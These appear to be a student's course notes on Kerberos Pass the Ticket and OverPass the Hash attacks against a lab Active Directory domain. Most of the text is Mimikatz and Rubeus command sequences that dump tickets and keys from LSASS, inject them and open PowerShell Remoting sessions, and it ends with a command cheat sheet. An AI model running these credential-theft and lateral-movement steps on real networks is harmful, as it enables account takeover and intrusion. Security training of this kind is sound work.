# Password Attacks - Pass the Ticket (PtT) from Windows

## Overview

**Pass the Ticket (PtT)** is a lateral movement technique where a valid **Kerberos ticket** is used instead of a password or NTLM hash.  
Rather than proving identity with a password, we present an already valid ticket to access resources.

This is different from:

- **Pass the Hash (PtH)** → uses an NTLM hash
- **Pass the Ticket (PtT)** → uses a Kerberos ticket
- **OverPass the Hash / Pass the Key** → uses a Kerberos key/hash to request a new TGT

---

## Kerberos refresher

Kerberos is a **ticket-based authentication protocol** used heavily in Active Directory.

### Main ticket types

#### Ticket Granting Ticket (TGT)
- The initial ticket obtained after successful authentication
- Used to request further service tickets
- If you have a valid TGT, you can request TGS tickets for services the user can access

#### Ticket Granting Service ticket (TGS)
- A service ticket for a specific resource
- Example: CIFS, LDAP, MSSQL, HTTP
- Used to authenticate to that specific service

### Core idea
Kerberos avoids sending the password to every service.  
Instead:

1. User authenticates to the KDC/DC
2. Gets a **TGT**
3. Uses the **TGT** to request a **TGS**
4. Presents the **TGS** to the target service

---

## PtT attack concept

To perform PtT, we need a valid Kerberos ticket, such as:

- **TGT** → useful for broader access
- **TGS** → useful for access to a specific service

Tickets on Windows are stored and managed by **LSASS**.

This means:

- **Standard user** → usually only access to own tickets
- **Local admin** → can dump tickets from all logged-on sessions

---

# Harvesting Kerberos tickets from Windows

## Where tickets live
Tickets are handled by **LSASS (Local Security Authority Subsystem Service)**.

Because of this, tools like **Mimikatz** and **Rubeus** can extract them.

---

## Export tickets with Mimikatz

### Command
```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

### Purpose
- Dumps all tickets from LSASS
- Exports them to `.kirbi` files on disk

### Example workflow
```cmd
c:\tools> mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

### Notes
- `.kirbi` files are Kerberos ticket files
- Tickets ending in **$** usually belong to **computer accounts**
- A ticket with service **krbtgt** is a **TGT**

### Example file naming logic
- `plaintext@krbtgt-domain.kirbi` → user TGT
- `DC01$@cifs-DC01.domain.kirbi` → computer service ticket

---

## Dump tickets with Rubeus

### Command
```cmd
Rubeus.exe dump /nowrap
```

### Purpose
- Dumps tickets from memory
- Outputs ticket data in **Base64** instead of saving directly to disk

### Why useful
- Easier copy/paste
- Less reliance on writing files
- Helpful when exporting `.kirbi` files is awkward

### Important note
To dump **all users' tickets**, you generally need **administrator rights**.

---

# Pass the Key / OverPass the Hash

## Concept

**OverPass the Hash** (also called **Pass the Key**) means:

- Take a Kerberos-capable key/hash from a user account
- Use it to request a fresh **TGT**
- Then use that TGT for access

This differs from classic PtH because we are interacting with **Kerberos**, not NTLM.

Useful keys include:

- `rc4_hmac_nt`
- `aes128_hmac`
- `aes256_hmac`

---

## Extract Kerberos keys with Mimikatz

### Command
```cmd
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

### Purpose
- Dumps Kerberos encryption keys for logged-on sessions

### Example output focus
```text
aes256_hmac       <AES256 key>
rc4_hmac_nt       <NTLM/RC4 key>
```

### Notes
- AES keys are preferred in modern environments
- Using RC4 in modern AD may be noisy and can indicate **encryption downgrade**

---

## OverPass the Hash with Mimikatz

### Command
```cmd
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

### Purpose
- Creates a new process in the target user’s context
- Injects the Kerberos/NTLM material into that process
- Typically opens a new `cmd.exe`

### Result
You can then use that new shell to request Kerberos tickets and access resources as that user.

### Notes
- Requires **administrator rights**
- Good when you already have the user’s NTLM hash

---

## OverPass the Hash with Rubeus

### Command
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES256KEY> /nowrap
```

### Purpose
- Requests a **TGT** using the provided AES/RC4 key
- Returns the TGT in **Base64**

### Useful variation
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<NTLMHASH> /ptt
```

### Notes
- `/ptt` = immediately inject ticket into current session
- Rubeus generally does **not** require admin for this part, unlike Mimikatz `sekurlsa::*`

---

# Performing Pass the Ticket (PtT)

## PtT with Rubeus using a `.kirbi` file

### Command
```cmd
Rubeus.exe ptt /ticket:<ticket.kirbi>
```

### Example
```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### Purpose
- Imports the Kerberos ticket into the current session

### Example validation
```cmd
dir \\DC01.inlanefreight.htb\c$
```

If the ticket is valid and authorized, access should work.

---

## PtT with Rubeus using Base64 ticket

### Convert `.kirbi` to Base64 with PowerShell
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

### Inject Base64 ticket
```cmd
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

### Purpose
- Useful when copy/pasting tickets rather than working with files
- Good for quick injection into the current logon session

---

## PtT with Mimikatz

### Command
```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\path\to\ticket.kirbi"
```

### Example
```cmd
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

### Purpose
- Imports the specified Kerberos ticket into the current session

### Validation
```cmd
dir \\DC01.inlanefreight.htb\c$
```

---

# PowerShell Remoting with PtT

## Why it matters
If the compromised ticket belongs to a user with:

- local admin rights, or
- membership in **Remote Management Users**, or
- explicit PS Remoting rights

then we may be able to move laterally with **PowerShell Remoting**.

---

## Mimikatz + PowerShell Remoting

### Step 1: Inject ticket
```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\path\to\ticket.kirbi"
exit
```

### Step 2: Start PowerShell
```cmd
powershell
```

### Step 3: Connect to target
```powershell
Enter-PSSession -ComputerName DC01
```

### Validation
```powershell
whoami
hostname
```

### Example result
```powershell
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```

---

## Rubeus + PowerShell Remoting

### Step 1: Create sacrificial netonly process
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

### Purpose
- Creates a **LOGON_TYPE 9** process
- Similar to `runas /netonly`
- Lets you keep ticket activity isolated from your existing logon session

### Step 2: In the new CMD window, request and inject TGT
```cmd
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AESKEY> /ptt
```

### Step 3: Start PowerShell and connect
```cmd
powershell
Enter-PSSession -ComputerName DC01
```

### Why this is useful
- Cleaner operationally
- Avoids overwriting existing TGTs in your current session
- Very handy during lateral movement

---

# Key tools

## Mimikatz
Used for:
- dumping tickets
- dumping Kerberos keys
- injecting tickets
- OverPass the Hash

### Key modules
```cmd
privilege::debug
sekurlsa::tickets /export
sekurlsa::ekeys
sekurlsa::pth
kerberos::ptt
```

---

## Rubeus
Used for:
- dumping tickets
- requesting TGTs
- injecting tickets
- creating netonly sessions

### Key modules
```cmd
dump
asktgt
ptt
createnetonly
```

---

# Key command summary

## Dump tickets with Mimikatz
```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

## Dump tickets with Rubeus
```cmd
Rubeus.exe dump /nowrap
```

## Dump Kerberos keys with Mimikatz
```cmd
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

## OverPass the Hash with Mimikatz
```cmd
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<hash>
```

## Request TGT with Rubeus
```cmd
Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<key> /nowrap
```

## Request and inject TGT with Rubeus
```cmd
Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<hash> /ptt
```

## Inject ticket with Rubeus
```cmd
Rubeus.exe ptt /ticket:<ticket.kirbi>
```

## Inject ticket with Mimikatz
```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\path\to\ticket.kirbi"
```

## Convert `.kirbi` to Base64
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

## PowerShell remoting after PtT
```powershell
Enter-PSSession -ComputerName DC01
```

---

# Practical notes

- **TGT** = more flexible than a single service ticket
- **krbtgt** in the ticket name usually means **TGT**
- **Computer account tickets** usually end in `$`
- **Admin rights** are commonly needed to dump tickets from LSASS
- **Rubeus** is often cleaner for ticket handling than Mimikatz
- In modern domains, **AES keys** are preferred over RC4
- Using **RC4** in Kerberos-heavy environments may stand out as an **encryption downgrade**
- `createnetonly` is very useful for isolating ticket injection into a fresh logon session

---

# OPSEC / detection considerations

- Ticket dumping from LSASS is highly suspicious and often detected
- Mimikatz is heavily signatured
- RC4-based ticket requests may stand out in modern AD
- PowerShell Remoting activity is logged in many environments
- Writing `.kirbi` files to disk may leave artifacts
- Rubeus and Mimikatz usage may trigger EDR/AV depending on controls in place

---

# Quick mental model

- **PtH** = use NTLM hash directly
- **OverPass the Hash / Pass the Key** = use key/hash to request a Kerberos TGT
- **PtT** = inject and use an already valid Kerberos ticket

Think of it like this:

- **PtH** = using a copied keycard hash
- **Pass the Key** = using a stolen secret to mint a fresh keycard
- **PtT** = using a valid keycard that someone already issued

---

# Tags

#password-attacks #active-directory #kerberos #ptt #passtheticket #rubeus #mimikatz #windows #lateral-movement